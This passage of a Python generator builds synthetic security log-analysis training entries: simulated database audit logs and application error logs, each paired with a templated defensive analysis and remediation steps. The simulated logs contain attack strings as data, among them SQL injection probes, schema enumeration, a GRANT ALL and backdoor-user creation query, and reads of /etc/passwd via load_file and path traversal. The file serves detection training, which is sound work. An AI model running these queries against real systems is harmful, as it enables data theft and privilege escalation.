    db_type = rng.choice(["PostgreSQL", "MySQL", "MSSQL", "MongoDB"])
    attacker_ip = rand_ip(rng)
    db_user = rng.choice(["webapp", "admin", "root", "api_user"])
    num_entries = rng.randint(6, 12)
    timestamps = _sequential_timestamps(rng, num_entries)

    tables = [rand_table_name(rng) for _ in range(3)]

    input_text = f"## Database Audit Log\n\n"
    input_text += f"**Database:** {db_type}\n"
    input_text += f"**Server:** db.{domain.split('.', 1)[-1]}\n\n"
    input_text += f"```\n"

    attack_queries = []
    for i in range(num_entries):
        ts = timestamps[i]
        if i < 2:
            # Normal queries first
            query = f"SELECT id, name FROM {tables[0]} WHERE status = 'active'"
            input_text += f"{ts} [{db_user}@{attacker_ip}] QUERY: {query}\n"
        elif i < 5:
            # Injection attempts
            payload = rng.choice(SQLI_PAYLOADS)
            query = f"SELECT * FROM {tables[0]} WHERE id = '{payload}'"
            input_text += f"{ts} [{db_user}@{attacker_ip}] QUERY: {query}\n"
            attack_queries.append(query)
        elif i < 8:
            # Schema enumeration
            query = rng.choice([
                "SELECT table_name FROM information_schema.tables",
                f"SELECT column_name FROM information_schema.columns WHERE table_name='{tables[1]}'",
                "SELECT user, host FROM mysql.user",
                f"SELECT * FROM {tables[1]} LIMIT 1000",
            ])
            input_text += f"{ts} [{db_user}@{attacker_ip}] QUERY: {query}\n"
            attack_queries.append(query)
        else:
            # Data exfiltration or privilege escalation
            query = rng.choice([
                f"SELECT * FROM {tables[1]}",
                f"GRANT ALL ON *.* TO '{db_user}'@'%'",
                f"CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password123'",
                f"SELECT load_file('/etc/passwd')",
            ])
            input_text += f"{ts} [{db_user}@{attacker_ip}] QUERY: {query}\n"
            attack_queries.append(query)

    input_text += f"```"

    cwe = "CWE-89"
    cwe_info = CWE_DB.get(cwe, {"name": "SQL Injection", "severity": ["high", "critical"]})

    output = f"## Database Audit Log Analysis\n\n"
    output += f"**Database:** {db_type}\n"
    output += f"**CWE:** {cwe} ({cwe_info['name']})\n"
    output += f"**Severity:** CRITICAL\n\n"

    output += f"### Attack Timeline\n"
    output += f"1. **Reconnaissance** ({timestamps[0]}): Normal-looking queries to test access.\n"
    output += f"2. **Injection Testing** ({timestamps[2]}): SQL injection payloads in query parameters.\n"
    output += f"3. **Schema Enumeration** ({timestamps[4] if len(timestamps) > 4 else 'N/A'}): Querying information_schema to map database structure.\n"
    output += f"4. **Data Exfiltration** ({timestamps[-1]}): Bulk data extraction or privilege escalation.\n\n"

    output += f"### Suspicious Queries\n"
    for q in attack_queries[:5]:
        output += f"- `{q[:100]}{'...' if len(q) > 100 else ''}`\n"
    output += f"\n"

    output += f"### Impact Assessment\n"
    output += f"- **Data at risk:** Tables `{', '.join(tables)}` may have been accessed or exfiltrated.\n"
    output += f"- **Credential exposure:** System tables queried for user credentials.\n"
    output += f"- **Privilege escalation:** Attempts to grant elevated permissions or create backdoor accounts.\n\n"

    output += f"### Recommended Actions\n"
    output += f"1. **Revoke** access for user `{db_user}` from IP {attacker_ip}.\n"
    output += f"2. **Audit** all data accessed during the attack window.\n"
    output += f"3. **Remove** any backdoor accounts created.\n"
    output += f"4. **Fix** the application vulnerability enabling SQL injection.\n"
    output += f"5. **Rotate** all database credentials.\n"
    output += f"6. **Enable** query parameterization in the application layer.\n"
    output += f"7. **Assess** data breach notification requirements.\n"

    return cwe, input_text, output, f"DB Attack: SQL Injection on {db_type}"


def _build_app_error_log_scenario(rng, complexity, domain):
    framework = rng.choice(list(FRAMEWORKS.keys()))
    fw_name = rng.choice(FRAMEWORKS[framework])
    num_entries = rng.randint(5, 10)
    timestamps = _sequential_timestamps(rng, num_entries)

    error_patterns = [
        ("NullPointerException", "Potential deserialization exploit", "CWE-502"),
        ("SqlSyntaxErrorException", "SQL injection causing malformed query", "CWE-89"),
        ("FileNotFoundException", "Path traversal attempt reaching non-existent path", "CWE-22"),
        ("OutOfMemoryError", "Denial of service via resource exhaustion", "CWE-400"),
        ("ClassCastException", "Type confusion from deserialization of untrusted data", "CWE-502"),
        ("StackOverflowError", "Recursive input causing stack overflow", "CWE-674" if "CWE-674" in CWE_DB else "CWE-400"),
        ("SSLHandshakeException", "TLS downgrade or certificate pinning bypass attempt", "CWE-295"),
        ("TemplateProcessingException", "Server-side template injection attempt", "CWE-94"),
    ]

    selected_errors = rng.sample(error_patterns, k=min(num_entries, len(error_patterns)))

    input_text = f"## Application Error Logs\n\n"
    input_text += f"**Application:** {fw_name} ({framework})\n"
    input_text += f"**Server:** {domain}\n\n"
    input_text += f"```\n"

    for i, (error, _, _) in enumerate(selected_errors):
        ts = timestamps[i]
        src_ip = rand_ip(rng)
        path = rand_path(rng)
        input_text += f"{ts} ERROR [{rng.choice(['http-nio', 'worker', 'request'])}] "
        input_text += f"[{src_ip}] {error}: "

        if "Sql" in error:
            input_text += f"near \"' OR '1'='1'\": syntax error at {path}\n"
            input_text += f"  at {fw_name}.db.QueryExecutor.execute(QueryExecutor.java:{rng.randint(50,200)})\n"
        elif "FileNotFound" in error:
            input_text += f"../../../etc/passwd (No such file or directory) at {path}\n"
            input_text += f"  at {fw_name}.io.FileHandler.read(FileHandler.java:{rng.randint(50,200)})\n"
        elif "NullPointer" in error:
            input_text += f"Cannot invoke method on null reference\n"
            input_text += f"  at {fw_name}.core.ObjectMapper.deserialize(ObjectMapper.java:{rng.randint(50,200)})\n"
        elif "OutOfMemory" in error:
            input_text += f"Java heap space - allocation of {rng.randint(100,999)}MB failed\n"
            input_text += f"  at {fw_name}.parser.XMLParser.parse(XMLParser.java:{rng.randint(50,200)})\n"
        elif "Template" in error:
            input_text += f"Exception evaluating expression: ${{7*7}}\n"
            input_text += f"  at {fw_name}.template.Engine.evaluate(Engine.java:{rng.randint(50,200)})\n"
        else:
            input_text += f"Unexpected error processing request at {path}\n"
            input_text += f"  at {fw_name}.core.Handler.process(Handler.java:{rng.randint(50,200)})\n"

    input_text += f"```"

    primary_cwe = selected_errors[0][2] if selected_errors[0][2] in CWE_DB else "CWE-89"
    cwe_info = CWE_DB.get(primary_cwe, {"name": "Application Error", "severity": ["high"]})

    output = f"## Application Error Log Analysis\n\n"
    output += f"**Application:** {fw_name}\n"
    output += f"**CWE:** {primary_cwe} ({cwe_info['name']})\n"
    output += f"**Severity:** HIGH\n\n"

    output += f"### Assessment\n"
    output += f"The application error logs reveal {len(selected_errors)} distinct error patterns "
    output += f"that are consistent with active exploitation attempts. The errors are not "
    output += f"random application failures but are triggered by malicious input.\n\n"

    output += f"### Error Classification\n\n"
    for error, desc, ecwe in selected_errors:
        ecwe_info = CWE_DB.get(ecwe, {"name": "Unknown", "severity": ["medium"]})
        output += f"**{error}** ({ecwe})\n"
        output += f"- Assessment: {desc}\n"
        output += f"- Risk: {rng.choice(ecwe_info.get('severity', ['medium'])).upper()}\n\n"

    output += f"### Key Observations\n"
    output += f"- Error messages may be leaking stack traces to attackers (information disclosure).\n"
    output += f"- Multiple attack vectors are being tested (injection, traversal, DoS).\n"
    output += f"- The attacker is likely in the reconnaissance/testing phase.\n\n"

    output += f"### Recommended Actions\n"
    output += f"1. **Disable** verbose error messages in production (use generic error pages).\n"
    output += f"2. **Review** input validation for all endpoints generating errors.\n"
    output += f"3. **Deploy** WAF rules targeting the identified attack patterns.\n"
    output += f"4. **Implement** structured logging that separates security events.\n"
    output += f"5. **Set up** alerts for error rate spikes (potential ongoing attack).\n"
    output += f"6. **Correlate** with web access logs to identify the attacker's IP.\n"

    return primary_cwe, input_text, output, f"App Errors: Active Exploitation on {fw_name}"


# ── Scenario dispatch ──────────────────────────────────────────────────────

SCENARIO_BUILDERS = [
    (_build_auth_log_scenario, 0.20),
    (_build_web_log_scenario, 0.20),
    (_build_firewall_log_scenario, 0.15),
    (_build_windows_event_scenario, 0.12),
    (_build_cloud_log_scenario, 0.12),
    (_build_db_log_scenario, 0.11),
    (_build_app_error_log_scenario, 0.10),
]

SCENARIO_FUNCS = [b[0] for b in SCENARIO_BUILDERS]
SCENARIO_WEIGHTS = [b[1] for b in SCENARIO_BUILDERS]


# ── Generator class ────────────────────────────────────────────────────────

class LogAnalysisGenerator(CategoryGenerator):
    category = "log_analysis"
    id_prefix = "xld-log"

    def generate_entries(self, rng: random.Random, count: int, start_id: int,
                         complexity_weights: Dict[str, float]) -> List[Dict[str, Any]]:
        entries: List[Dict[str, Any]] = []
        idx = start_id

        for _ in range(count):
            complexity = pick_complexity(rng, complexity_weights)
            severity = pick_severity(rng, complexity)
            domain = rand_domain(rng)

            builder = rng.choices(SCENARIO_FUNCS, weights=SCENARIO_WEIGHTS, k=1)[0]
            cwe, input_text, output_text, title = builder(rng, complexity, domain)
            instruction = rng.choice(ALL_INSTRUCTIONS)

            entries.append(format_entry(
                entry_id=self.make_id(idx),
                title=title,
                severity=severity,
                cwe=cwe,
                instruction=instruction,
                input_text=input_text,
                output_text=output_text,
            ))
            idx += 1

        return entries
